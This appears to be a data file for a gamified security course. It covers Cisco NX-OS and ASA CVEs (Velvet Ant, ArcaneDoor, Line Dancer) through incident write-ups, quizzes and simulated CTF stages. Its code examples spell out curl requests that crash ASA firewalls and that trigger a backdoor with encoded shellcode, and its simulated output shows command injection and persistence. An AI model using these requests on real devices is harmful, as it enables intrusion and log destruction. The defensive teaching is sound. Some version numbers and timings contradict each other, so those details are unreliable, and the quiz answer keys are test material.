          "Sygnia's remediation required taking offline copies of the switch filesystems and analyzing them on isolated hardware — comparing file modification times, checksums of every file, and contents of startup scripts against known-good Cisco factory images. The compromised Nexus switches had to be physically replaced and rebuilt from verified factory firmware rather than simply re-imaged, because the depth of the compromise meant the existing storage could not be trusted. The incident prompted Cisco to publish NX-OS integrity verification guidance and drove CIS and NIST to explicitly include network device firmware integrity verification in security frameworks — recognizing that switches and routers require the same forensic discipline as servers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Velvet Ant (APT)", sub: "privileged NX-OS CLI session", type: "attacker" },
          { label: "NX-OS CLI", sub: "unsanitized parameter → shell injection", type: "system" },
          { label: "Underlying Linux OS", sub: "root access outside NX-OS RBAC", type: "victim" },
          { label: "3-Year Persistence", sub: "data center traffic visible", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Velvet Ant begins persistence on Cisco Nexus switches at Fortune 500" },
        { year: 2024, event: "Sygnia discovers 3+ year APT presence; CVE-2024-20399 disclosed", highlight: true },
        { year: 2024, event: "Cisco releases NX-OS patches; organizations audit switch integrity" },
      ],
      keyTakeaways: [
        "Network infrastructure can host APT persistence — monitor switches and routers, not just servers",
        "CLI injection vulnerabilities are severe even with authentication requirements in post-exploitation chains",
        "Defense must include network device integrity verification (file system baseline, firmware attestation)",
        "RBAC in NX-OS doesn't protect against OS-level command injection via CLI parameters",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2024-20399", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nxos-cmd-injection-xD9OhyOP" },
        { title: "Sygnia: Velvet Ant Disclosure", url: "https://www.sygnia.co/blog/velvet-ant-cisco-nx-os-zero-day/" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m20-q1", type: "The Flaw", challenge: "Affected OS.", text: "CVE-2024-20399 exploited unsanitized parameters in which Cisco OS's CLI?", options: ["Cisco NX-OS — running on Nexus data center switches","IOS XR","ASA software","Umbrella SWG"], correctIndex: 0, explanation: "The CLI argument injection affected NX-OS on Nexus switches." },
        { id: "stage-m20-q2", type: "Access", challenge: "Auth needed.", text: "Could unauthenticated attackers gain root via CVE-2024-20399?", options: ["No — authenticated access with privilege level 5+ was required","Yes, fully unauthenticated","Only physical access","Only a guest account"], correctIndex: 0, explanation: "The vulnerable command required an authenticated account at privilege level 5 or higher." },
        { id: "stage-m20-q3", type: "Impact", challenge: "Why dangerous.", text: "What made CVE-2024-20399 dangerous despite needing authentication?", options: ["It broke out of NX-OS RBAC entirely, granting Linux root invisible to NX-OS monitoring","It only printed logs","It just rebooted the switch","It required no skill"], correctIndex: 0, explanation: "The injection escaped NX-OS RBAC to the underlying Linux OS as root, evading NX-OS visibility." },
        { id: "stage-m20-q4", type: "Real World", challenge: "Velvet Ant dwell.", text: "How long did Velvet Ant persist in the data center switches before detection?", options: ["Over 3 years — since ~2021, discovered in 2024","About a week","Six months","It was caught immediately"], correctIndex: 0, explanation: "The Velvet Ant APT hid in the core switches for roughly three years undetected." },
        { id: "stage-m20-q5", type: "Mechanics", challenge: "Persistence.", text: "Why does persistence in /etc/rc.d/rc.local survive NX-OS upgrades?", options: ["The underlying Linux init scripts persist independently of the NX-OS software layer","It doesn't survive upgrades","NX-OS wipes Linux","rc.local is read-only"], correctIndex: 0, explanation: "The Linux OS beneath NX-OS retains its init scripts across NX-OS software updates." },
        { id: "stage-m20-q6", type: "Concept", challenge: "RBAC bypass.", text: "Why is escaping NX-OS RBAC to Linux root so impactful for defenders?", options: ["Activity at the Linux layer is invisible to NX-OS logging and controls","It's fully logged by NX-OS","It limits the attacker","It triggers alerts automatically"], correctIndex: 0, explanation: "Operating below the NX-OS abstraction evades the device's own monitoring and policy." },
        { id: "stage-m20-q7", type: "Defense", challenge: "Detection.", text: "What helps detect a Linux-layer implant on a Nexus switch?", options: ["File integrity baselines and external telemetry rather than NX-OS 'show' commands alone","Only 'show run'","Checking the banner","Counting interfaces"], correctIndex: 0, explanation: "Because NX-OS can't see the implant, integrity checks and out-of-band telemetry are needed." },
        { id: "stage-m20-q8", type: "Defense", challenge: "Limiting access.", text: "What reduces the risk of an authenticated CLI-injection flaw like this?", options: ["Tight privilege management, limiting level-5+ accounts, and monitoring privileged use","Sharing admin accounts","Disabling authentication","Granting all users level 15"], correctIndex: 0, explanation: "Minimizing high-privilege accounts and watching their use shrinks the exploit population." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.20",
        hostname: "nexus-9336",
        os: "Cisco NX-OS 10.2.3",
        openPorts: "443/tcp (NX-API), 22/tcp (SSH mgmt)",
        vulnerability: "CVE-2024-20399 — NX-OS command injection via CLI, CVSS 6.0",
      },
      pivotTrigger: "nxos-inject",
      scenario: "You have a low-privilege NX-OS CLI session on a Cisco Nexus 9000 switch. Use CVE-2024-20399 to inject OS commands and install a persistence mechanism on the underlying Linux OS.",
      hint: "Inject shell metacharacters into a vulnerable NX-OS CLI command parameter to break out to the underlying OS.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm NX-OS version and identify the injectable command. Run: nxos-enum 10.0.0.254",
        "Inject OS command via the vulnerable CLI parameter. Run: nxos-inject 10.0.0.254",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — Velvet Ant Nexus Target" },
        { trigger: "nxos-enum 10.0.0.254", value: "20399_NXOS_", label: "NX-OS Version Confirmed — Injection Point Identified" },
        { trigger: "nxos-inject 10.0.0.254", value: "CLI_INJ3CT}", label: "OS Shell Spawned — Persistence Installed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VELVET ANT",
          "Target: Cisco Nexus 9300  NX-OS: 10.1.2",
          "CVE: 2024-20399  CVSS: 6.0  APT: Velvet Ant",
          "",
          "CLI injection to underlying Linux OS — privilege 5+ required.",
          "Sequence: nxos-enum → nxos-inject → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "nxos-enum": (_args: string[]) => ({
          lines: [
            "NX-OS session: nexus# (privilege level 7)",
            "Version: 10.1.2 — VULNERABLE (fix: 10.2.5)",
            "Injectable command identified: 'show' with unsanitized args",
            "Shell metacharacter handling: ABSENT",
            "",
            ">> LEARN: NX-OS runs on Linux — two distinct security layers",
            "   NX-OS RBAC controls the CLI, but not the underlying Linux OS directly.",
            "   Velvet Ant used this to hide persistence for 3+ years below NX-OS visibility.",
            "   Real NX-OS command: show system integrity — check for filesystem anomalies.",
          ],
        }),
        "nxos-inject": (_args: string[]) => ({
          lines: [
            "Injecting: nexus# show version | head -1 ; id",
            "Output: Cisco NX-OS Software",
            "Output: uid=0(root) gid=0(root)",
            "OS-level root achieved outside NX-OS RBAC.",
            "Writing persistence: /etc/rc.d/rc.local modified.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: CLI injection bypasses NX-OS RBAC for Linux root",
            "   Shell metacharacters (;, |, &&) chain OS commands alongside NX-OS output.",
            "   Persistence in /etc/rc.d/rc.local survives reboots and NX-OS upgrades.",
            "   Real NX-OS command: show running-config | include feature bash — check bash access.",
          ],
        }),
      },
    },
  },

  // ─── Stage m21: CVE-2024-20353 — Cisco ASA/FTD DoS (ArcaneDoor) ─────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Communications Security Establishment", location: "Ottawa, Ontario, Canada", era: "2024 CE", emoji: "🍁" },
    id: "stage-m21",
    order: 21,
    title: "ArcaneDoor: The Phantom Crash",
    subtitle: "CVE-2024-20353 — Cisco ASA/FTD Management DoS, CVSS 8.6",
    category: "cybersecurity",
    cveId: "CVE-2024-20353",
    cvssScore: 8.6,
    xp: 150,
    badge: { id: "badge-m-arcanedoor-dos", name: "Phantom Crasher", emoji: "🍁" },
    challengeType: "ctf",
    info: {
      tagline: "ArcaneDoor: a Chinese state actor crashed Cisco firewalls to cover their tracks with zero-days.",
      year: 2024,
      overview: [
        "CVE-2024-20353 is one of two zero-day vulnerabilities used in the ArcaneDoor espionage campaign attributed to a Chinese state-sponsored actor (tracked as UAT4356 / Storm-1849). The vulnerability allows an unauthenticated attacker to cause a denial of service (reload) of Cisco ASA and FTD devices by sending a specially crafted HTTP request to the management or data plane interface.",
        "ArcaneDoor targeted government networks worldwide in a campaign discovered by Cisco Talos in early 2024. The attackers used CVE-2024-20353 to crash firewalls — likely to disrupt logging and detection — and CVE-2024-20359 to install a persistent backdoor. Together, the two CVEs formed a complete attack chain against the most widely deployed enterprise firewalls.",
        "The DoS capability was used operationally to blind defenders: crashing the firewall wiped its logs and disabled monitoring, giving the attackers a window to complete other operations undetected.",
      ],
      technical: {
        title: "ASA Multipart Parser Crash — CVE-2024-20353 Mechanics",
        body: [
          "The Cisco ASA and FTD HTTPS stack processed HTTP multipart form data for WebVPN and ASDM management requests. The multipart parser expected a valid boundary string following `Content-Type: multipart/form-data; boundary=`. When the boundary value was empty or malformed — `boundary=` with nothing after the equals sign — the parser attempted to locate the boundary in the request body but entered a code path that dereferenced a NULL or uninitialized pointer when iterating the empty boundary pattern. This caused the HTTPS process to crash, generating a core dump. When the ASA's HTTPS service crashes, the device enters a mandatory reload sequence: all in-memory state is lost, all active VPN sessions are terminated, all ACLs and NAT rules are suspended during the reload, and — critically — the in-memory log buffer that recorded events leading up to the crash is destroyed. The reload takes approximately 60–90 seconds.",
          "Because the attack targeted HTTPS (port 443) and the ASA's WebVPN, ASDM, and AnyConnect services all share the same HTTPS stack, the vulnerability was present on any ASA or FTD with any HTTPS-based service enabled — which included virtually every enterprise-deployed ASA. Restricting management access (via `http` access-control commands) mitigated the attack against ASDM but did not protect against the attack surface exposed by WebVPN and AnyConnect services, which are inherently internet-facing by design. UAT4356 exploited the crash deliberately as an operational technique: trigger crash → logs destroyed → reload window → install backdoor during the 60-90 second window where the ASA was not yet enforcing policy.",
        ],
        codeExample: {
          label: "CVE-2024-20353 — crash Cisco ASA via malformed multipart HTTP request",
          code: `# ── STEP 1: Confirm ASA version is in vulnerable range ───────────────────
curl -k -o /dev/null -s -w "%{http_code}" https://ASA_IP/+CSCOE+/logon.html
# 200 → ASA WebVPN accessible; check version in advisory

# ── STEP 2: Send malformed multipart request — empty boundary triggers crash
curl -k -X POST https://ASA_IP/+CSCOE+/logon.html \
  -H 'Content-Type: multipart/form-data; boundary=' \
  -d $'--\r\nContent-Disposition: form-data; name="username"\r\n\r\nadmin\r\n--'
# ASA multipart parser: NULL pointer dereference on empty boundary
# HTTPS process crashes → device reload initiated

# ── STEP 3: Observe reload window (60-90 seconds) ────────────────────────
# In-memory log buffer: CLEARED — pre-crash activity unrecoverable
# Active VPN sessions: TERMINATED
# ArcaneDoor operation: install Line Dancer (CVE-2024-20359) during this window

# ── DETECTION ─────────────────────────────────────────────────────────────
show reload
# Check: unexpected reloads with reason "Traceback" or "Process crash"
show logging
# WARNING: logs before crash are lost if not forwarded to external SIEM

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to: ASA 9.12.4.50 / 9.16.4.30 / 9.18.4.21 or later
# Configure external syslog: logging host <SIEM-IP>
# Restrict HTTPS management: http <mgmt-net> <mask> management`,
        },
      },
      incident: {
        title: "ArcaneDoor — Nation-State Firewall Espionage Campaign (Late 2023–2024)",
        when: "Late 2023 (campaign start); April 24, 2024 (Cisco Talos disclosure)",
        where: "Government perimeter firewalls worldwide — Europe, North America, Asia-Pacific, Middle East",
        impact: "Nation-state persistent access to government network perimeters; classified traffic potentially intercepted; logs destroyed to cover tracks",
        body: [
          "Cisco Talos disclosed ArcaneDoor on April 24, 2024, after several months of tracking the campaign. The attackers — tracked as UAT4356 by Cisco and Storm-1849 by Microsoft — demonstrated exceptional knowledge of Cisco ASA internals: they knew how to trigger a crash that cleared logs, they knew the specific mechanism for persisting through reboots via the legacy plug-in loading feature, and they had built a custom implant (Line Dancer) that operated entirely in memory and specifically disabled syslog and SNMP to evade external monitoring. This level of specificity suggested either prior access to Cisco ASA source code, extensive hardware-level reverse engineering over months, or both.",
          "The operational tradecraft was sophisticated. UAT4356 used CVE-2024-20353 not as a denial-of-service attack but as a log destruction technique — deliberately creating a 60-90 second window without logs during which they could install their Line Dancer backdoor. Defenders who investigated the incidents found only post-reboot logs; the pre-crash activity that would have revealed the intrusion was permanently gone. The attackers then operated through Line Dancer during brief sessions, disabling logging before acting and re-enabling it afterward, so even external SIEM logs showed no anomalies during operations.",
          "A joint advisory from CISA, the NSA, the Australian Signals Directorate (ASD), the Canadian Centre for Cyber Security (CCCS), and the UK National Cyber Security Centre (NCSC) — the full Five Eyes intelligence community — was published alongside the Cisco Talos disclosure. The joint advisory was significant: Five Eyes agencies coordinating a public advisory about a specific campaign against government perimeter infrastructure indicated the severity and breadth of the targeting. Organizations were directed to verify ASA flash integrity using Cisco's published hash verification script, check for unexpected reloads in external SIEM data going back 90 days, and patch immediately to the versions specified in the advisory.",
        ],
      },
      diagram: {
        nodes: [
          { label: "UAT4356 (APT)", sub: "malformed HTTPS to management interface", type: "attacker" },
          { label: "ASA HTTP Parser", sub: "multipart parsing exception", type: "system" },
          { label: "ASA Firewall", sub: "reload — in-memory logs cleared", type: "victim" },
          { label: "Detection Blind Spot", sub: "30s window for follow-on ops", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Late 2023: ArcaneDoor campaign begins targeting government ASA firewalls" },
        { year: 2024, event: "Apr: Cisco Talos discloses ArcaneDoor — two ASA zero-days revealed", highlight: true },
        { year: 2024, event: "Cisco releases emergency patches; multiple government CERTs issue alerts" },
      ],
      keyTakeaways: [
        "Crashing a firewall is an attack technique — monitor for unexpected reloads in network device logs",
        "Management interfaces on perimeter firewalls must be restricted to management networks — never exposed to internet",
        "Zero-day chaining (DoS + persistent RCE) is a hallmark of sophisticated nation-state operations",
        "Subscribe to Cisco PSIRT advisories; perimeter firewalls require emergency patching cadence",
      ],
      references: [
        { title: "Cisco Talos: ArcaneDoor", url: "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/" },
        { title: "Cisco Advisory — CVE-2024-20353", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-websrvs-dos-X8gNucD2" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m21-q1", type: "The Flaw", challenge: "Crash goal.", text: "In ArcaneDoor, CVE-2024-20353 crashed Cisco ASA firewalls. What was the primary operational goal?", options: ["Clear in-memory logs to create a detection blind spot before follow-on operations","Permanently brick the device","Steal the config only","Demand a ransom"], correctIndex: 0, explanation: "The crash wiped volatile logs, blinding defenders ahead of further intrusion steps." },
        { id: "stage-m21-q2", type: "Access", challenge: "Auth needed?", text: "Did CVE-2024-20353 require valid admin credentials?", options: ["No — the malformed multipart HTTP request was sendable by an unauthenticated attacker","Yes, admin login required","Only a read-only account","Physical access only"], correctIndex: 0, explanation: "The crashing request needed no authentication, making it remotely triggerable." },
        { id: "stage-m21-q3", type: "Mechanics", challenge: "CVE chain.", text: "What CVE combination did ArcaneDoor use for persistent access?", options: ["CVE-2024-20353 (DoS/log wipe) chained with CVE-2024-20359 (persistent backdoor)","Two DoS bugs only","A single SQL injection","No chaining"], correctIndex: 0, explanation: "The crash/log-wipe was chained with the persistence flaw to install a durable backdoor quietly." },
        { id: "stage-m21-q4", type: "Attribution", challenge: "Who did it.", text: "Which threat actor was attributed to ArcaneDoor?", options: ["UAT4356 — a Chinese state-sponsored APT (also tracked as Storm-1849)","A lone hacktivist","A ransomware affiliate","An insider"], correctIndex: 0, explanation: "The espionage campaign was attributed to UAT4356 / Storm-1849, a Chinese state actor." },
        { id: "stage-m21-q5", type: "Defense", challenge: "Surviving the wipe.", text: "Does forwarding ASA syslogs to an external SIEM prevent log loss from this crash?", options: ["Yes — externally forwarded syslogs survive the reload; only the in-memory buffer is lost","No, SIEM logs are also wiped","Only if encrypted","Only on 64-bit ASA"], correctIndex: 0, explanation: "External syslog forwarding preserves evidence the device's volatile buffer loses on crash." },
        { id: "stage-m21-q6", type: "Concept", challenge: "Why wipe logs.", text: "Why would an attacker crash a firewall specifically to clear in-memory logs?", options: ["To remove evidence of intrusion and create a blind spot for follow-on activity","To improve performance","To trigger a patch","To alert defenders"], correctIndex: 0, explanation: "Destroying volatile logs hampers detection and forensics during the operation." },
        { id: "stage-m21-q7", type: "Defense", challenge: "Detection strategy.", text: "What is the key defensive takeaway from the log-wipe technique?", options: ["Centralize logs off-device so evidence survives appliance crashes","Keep logs only on the device","Disable logging to save space","Trust on-box logs alone"], correctIndex: 0, explanation: "Off-device log centralization defeats on-device log destruction." },
        { id: "stage-m21-q8", type: "Concept", challenge: "Edge espionage.", text: "Why are perimeter firewalls prime targets for nation-state espionage like ArcaneDoor?", options: ["They see all ingress/egress traffic and sit outside many internal monitoring tools","They are unimportant","They have no traffic visibility","They are always isolated"], correctIndex: 0, explanation: "Edge firewalls offer a powerful vantage point and often escape internal EDR coverage." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.42",
        hostname: "asa-5555x",
        os: "Cisco ASA 9.16.4 (unpatched)",
        openPorts: "443/tcp (AnyConnect), 500/udp (IKE)",
        vulnerability: "CVE-2024-20353 — ArcaneDoor ASA DoS, CVSS 8.6",
      },
      scenario: "A government ASA firewall is running unpatched firmware. Exploit CVE-2024-20353 to crash the device, clear its logs, and create a detection window for follow-on operations.",
      hint: "Send a malformed multipart HTTP request to the ASA management interface to trigger the parsing exception and reload.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the ASA version is vulnerable. Run: asa-check asa.gov.target",
        "Send the crafted HTTP request to crash the firewall. Run: arcanedoor-dos asa.gov.target",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — ArcaneDoor Government Target" },
        { trigger: "asa-check asa.gov.target", value: "20353_ASA_", label: "ASA Version Confirmed — DoS Vulnerability Present" },
        { trigger: "arcanedoor-dos asa.gov.target", value: "D0S_L0GS_CL34R}", label: "ASA Crashed — Logs Cleared — Detection Window Open" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: ARCANE DOOR (Phase 1)",
          "Target: Cisco ASA 5516-X  Firmware: 9.12.4.45",
          "CVE: 2024-20353  CVSS: 8.6  APT: UAT4356",
          "",
          "DoS crash to clear logs — creates window for phase 2.",
          "Sequence: asa-check → arcanedoor-dos → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "asa-check": (_args: string[]) => ({
          lines: [
            "Probing ASA management interface...",
            "Version: 9.12.4.45 — VULNERABLE (fix: 9.12.4.50)",
            "Management HTTPS: accessible",
            "WebVPN: enabled — attack surface confirmed",
            "",
            ">> LEARN: ASA management must never be internet-facing",
            "   WebVPN and ASDM share the same HTTPS stack — enabling either exposes the mgmt plane.",
            "   Restrict management access with: http <trusted-ip> <mask> <interface>",
            "   Real ASA command: show run http — view which IPs can reach the management UI.",
          ],
        }),
        "arcanedoor-dos": (_args: string[]) => ({
          lines: [
            "Sending malformed multipart HTTP POST to management interface...",
            "Content-Type: multipart/form-data; boundary= (empty boundary)",
            "ASA parser exception triggered.",
            "Device reloading... (30-second window)",
            "In-memory log buffer: CLEARED",
            "Detection blind spot established. Phase 2 ready.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Crashing a firewall wipes its in-memory logs",
            "   APT actors crash firewalls deliberately to erase evidence of pre-crash activity.",
            "   Send syslogs to an external SIEM — in-memory logs are lost on every reload.",
            "   Real ASA command: show logging — verify syslog is forwarding to an external host.",
          ],
        }),
      },
    },
  },

  // ─── Stage m22: CVE-2024-20359 — Cisco ASA/FTD Persistent RCE (ArcaneDoor) ──
  {
    epochId: "cisco-enterprise",
    wonder: { name: "ANSSI HQ", location: "Paris, France", era: "2024 CE", emoji: "🗼" },
    id: "stage-m22",
    order: 22,
    title: "ArcaneDoor: Line Dancer",
    subtitle: "CVE-2024-20359 — Cisco ASA/FTD Persistent RCE, CVSS 6.0",
    category: "cybersecurity",
    cveId: "CVE-2024-20359",
    cvssScore: 6.0,
    xp: 150,
    badge: { id: "badge-m-linedancer", name: "Line Dancer", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "Line Dancer: the ArcaneDoor backdoor that survived ASA reboots and evaded all standard detection.",
      year: 2024,
      overview: [
        "CVE-2024-20359 is the second zero-day in the ArcaneDoor campaign — a privilege escalation and persistent code execution vulnerability in Cisco ASA and FTD. While CVE-2024-20353 crashed the firewall to clear logs, CVE-2024-20359 allowed the attackers to install 'Line Dancer': an in-memory shellcode backdoor that survived device reloads.",
        "The vulnerability affected a legacy capability that allowed pre-loaded VPN clients and plug-ins to persist across reboots. By abusing this mechanism, the attackers could load arbitrary code that would execute automatically each time the ASA booted — invisible to standard 'show' commands and device integrity checks.",
        "Line Dancer operated entirely in memory, intercepting HTTPS POST requests and executing attacker-supplied shellcode. It disabled syslog and SNMP traps to blind monitoring systems and implemented a 'host knock' authentication mechanism so only the attackers could trigger its functionality.",
      ],
      technical: {
        title: "Flash-Resident Boot Persistence and In-Memory Backdoor — CVE-2024-20359 Mechanics",
        body: [
          "Cisco ASA included a legacy feature allowing administrators to pre-load VPN client packages and ASDM images from flash storage — these would be automatically served to connecting AnyConnect clients or loaded for ASDM management. The code implementing this feature ran during the ASA boot sequence, loading and executing packages from flash paths specified in the running configuration. CVE-2024-20359 identified that this package loading mechanism did not verify the cryptographic signature of the loaded file — it only checked that the configured path existed in flash. An attacker with administrative access could modify the configuration to point this mechanism at an arbitrary file, which would then be loaded and executed with kernel-level privileges during every subsequent boot. This is the mechanism UAT4356 used to install Line Dancer: write the implant to a flash file (disguised as `upgrade.pkg`), add a configuration entry pointing the legacy plug-in loader at that file, and every reboot re-executes the implant automatically.",
          "Line Dancer was engineered for operational stealth. It hooked into the ASA's HTTPS request processing pipeline at a layer below the normal handler stack, intercepting all incoming POST requests before authentication or routing occurred. Requests containing the specific 'host knock' value in the HTTP Host header were processed by Line Dancer — the shellcode payload in the request body was extracted, decoded, and executed in memory. All other requests passed through to the normal ASA handler unchanged. Before each operational session, Line Dancer disabled syslog forwarding and SNMP trap generation to prevent external monitoring from recording any activity. After the session, it re-enabled them. The implant had no file system footprint during operation — all execution was in memory — making it invisible to standard `show file` commands and filesystem audits that didn't compare cryptographic hashes.",
        ],
        codeExample: {
          label: "Line Dancer — ArcaneDoor's boot-persistent ASA shellcode backdoor",
          code: `# ── PRE-CONDITION: Line Dancer installed via CVE-2024-20359 ───────────────
# admin access used to write implant to /flash/upgrade.pkg
# ASA config modified: boot system flash:upgrade.pkg
# Every reboot re-loads Line Dancer at kernel privilege level

# ── STEP 1: Locate the host-knock value in implant configuration ──────────
# (from forensic analysis of /flash/upgrade.pkg)
python3 extract-ld-config.py upgrade.pkg
# Host-knock value: LD-TRIGGER-8a3f2b1c
# Syslog disable: enabled before each session
# C2 channel: in-band HTTPS POST — no separate connection

# ── STEP 2: Trigger Line Dancer with host-knock POST request ──────────────
curl -k -X POST https://ASA_IP/+CSCOE+/logon.html \
  -H 'Host: LD-TRIGGER-8a3f2b1c' \
  -d "shellcode=$(python3 encode-payload.py routing-table-dump.bin)"
# Line Dancer intercepts request before ASA HTTPS handler
# Shellcode executed in ASA process context — root privilege
# Response: routing table, interface list, ARP cache

# ── DETECTION ─────────────────────────────────────────────────────────────
verify /sha512 disk0:upgrade.pkg
# Compare hash against Cisco's published baseline for your ASA version
# ANY mismatch in flash file hashes = potential Line Dancer installation
show logging | include disable
# Check for unexpected syslog disable/enable cycles

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to ASA 9.12.4.50 / 9.16.4.30 / 9.18.4.21 or later
# Run Cisco's asa-verify integrity script on all ASA/FTD devices
# Replace compromised devices from factory-verified firmware — do not re-image`,
        },
      },
      incident: {
        title: "Line Dancer — The Implant That Blinded Its Own Firewall (2024)",
        when: "Late 2023 (implant installed); April 24, 2024 (Cisco Talos public disclosure)",
        where: "Government perimeter ASA firewalls across Europe, Asia-Pacific, Middle East, and North America",
        impact: "Persistent nation-state access to government network perimeters; syslog and SNMP disabled during operations; all firewall traffic potentially intercepted",
        body: [
          "Cisco Talos reverse-engineered Line Dancer from memory images obtained during incident response at affected government organizations and published a comprehensive technical analysis on April 24, 2024. The implant demonstrated nation-state-level engineering: it operated entirely in memory, loaded via a legacy ASA boot mechanism, hooked the HTTPS processing pipeline below the authentication layer, implemented a host-knock C2 authentication mechanism to prevent passive traffic analysis from discovering it, and specifically disabled syslog and SNMP during operations to prevent any external monitoring system from logging its activity. The disabling of syslog was the key anti-forensic capability — even organizations with well-configured external SIEMs would have no logs from windows when Line Dancer was active.",
          "The campaign was ultimately discovered not through log analysis but through performance anomalies. One affected government organization noticed brief CPU spikes on their ASA firewall during periods when no VPN sessions were active — a side channel created by Line Dancer executing shellcode. When Cisco Talos examined the device, they found the `upgrade.pkg` file in flash with a hash that did not match Cisco's published baseline. The implant's sophistication — particularly its ability to re-establish persistence through reboots and software upgrades using the legitimate Cisco plug-in loading mechanism — suggested either access to Cisco's ASA source code or months of dedicated hardware-level reverse engineering.",
          "Cisco's response included releasing the `asa-verify` script, which extracted file hashes from ASA flash storage and compared them against a Cisco-signed manifest of known-good files for each ASA software version. Organizations running the script discovered Line Dancer on devices they had considered clean. The remediation guidance was unusually definitive: devices with modified flash contents should be physically replaced with factory-new units and rebuilt from scratch — not re-imaged — because the ASA's flash controller itself could not be trusted once a sophisticated implant had administrative access. The ArcaneDoor campaign established a new benchmark for network device security: treating perimeter firewalls with the same forensic scrutiny previously reserved for compromised servers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "UAT4356 (APT)", sub: "'host knock' HTTPS POST", type: "attacker" },
          { label: "Line Dancer Implant", sub: "hooked into ASA HTTPS pipeline", type: "system" },
          { label: "ASA (fully backdoored)", sub: "syslog disabled, SNMP traps off", type: "victim" },
          { label: "Persistent RCE", sub: "survives reboots — invisible to show cmds", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Late 2023: Line Dancer implant installed on government ASA firewalls" },
        { year: 2024, event: "Apr: Cisco Talos reverse-engineers Line Dancer; implant published", highlight: true },
        { year: 2024, event: "CISA and multiple government CERTs issue emergency directives" },
        { year: 2024, event: "Cisco provides integrity verification scripts; organizations audit flash" },
      ],
      keyTakeaways: [
        "Network device firmware integrity must be verified — compare flash contents against signed Cisco baselines",
        "Disabled syslog and SNMP are red flags — monitor for configuration changes to logging",
        "Nation-state implants operate below the OS — standard security tools are blind to them",
        "Restrict administrative access to ASA/FTD to dedicated management networks with MFA",
      ],
      references: [
        { title: "Cisco Talos: Line Dancer Analysis", url: "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/" },
        { title: "Cisco Advisory — CVE-2024-20359", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-persist-rce-FLsNXF4h" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m22-q1", type: "The Flaw", challenge: "Persistence trick.", text: "The Line Dancer implant (CVE-2024-20359) survived ASA reboots by abusing what?", options: ["A VPN client/plug-in pre-loading mechanism that executed files from flash on boot","A cron job in /etc","A modified startup-config line","A BIOS rootkit"], correctIndex: 0, explanation: "It abused a legacy plug-in preload feature to run attacker code from flash at boot." },
        { id: "stage-m22-q2", type: "Stealth", challenge: "Config visibility.", text: "Did Line Dancer appear in the ASA 'show run' configuration output?", options: ["No — it operated entirely in memory and was invisible to standard 'show' commands","Yes, as a service line","Yes, as an ACL","Yes, in the banner"], correctIndex: 0, explanation: "The implant ran in memory, leaving no trace in the visible running configuration." },
        { id: "stage-m22-q3", type: "Mechanics", challenge: "Operator trigger.", text: "How did Line Dancer authenticate its operator to avoid accidental discovery?", options: ["A 'host knock' — only HTTPS POSTs with a specific Host header value triggered shellcode","A hardcoded password prompt","An SSH key","A TLS client cert"], correctIndex: 0, explanation: "A magic Host header value acted as a covert knock to activate the implant." },
        { id: "stage-m22-q4", type: "Stealth", challenge: "Blinding defenders.", text: "What monitoring did Line Dancer disable on the compromised ASA?", options: ["Syslog forwarding and SNMP traps","Only NetFlow","DNS logging only","Nothing"], correctIndex: 0, explanation: "It turned off syslog forwarding and SNMP traps to suppress alerting during operations." },
        { id: "stage-m22-q5", type: "Defense", challenge: "Detection method.", text: "Are standard 'show' commands sufficient to detect Line Dancer?", options: ["No — detection required comparing flash file hashes against Cisco-signed baselines","Yes, 'show run' reveals it","Yes, 'show memory'","Yes, 'show version'"], correctIndex: 0, explanation: "Only forensic flash hash comparison against signed baselines reliably exposed the implant." },
        { id: "stage-m22-q6", type: "Concept", challenge: "In-memory advantage.", text: "Why does an in-memory implant frustrate standard incident response?", options: ["It leaves little persistent on-disk evidence and evades config/log review","It is easy to dump with 'show run'","It always crashes the device","It is logged automatically"], correctIndex: 0, explanation: "Memory-resident malware avoids the artifacts IR teams normally inspect." },
        { id: "stage-m22-q7", type: "Defense", challenge: "Trusted baselines.", text: "Why are Cisco-signed file hash baselines critical against implants like this?", options: ["They let defenders detect unauthorized modifications the device itself won't reveal","They speed up boot","They replace patching","They disable logging"], correctIndex: 0, explanation: "Comparing against signed baselines surfaces tampering invisible to normal device commands." },
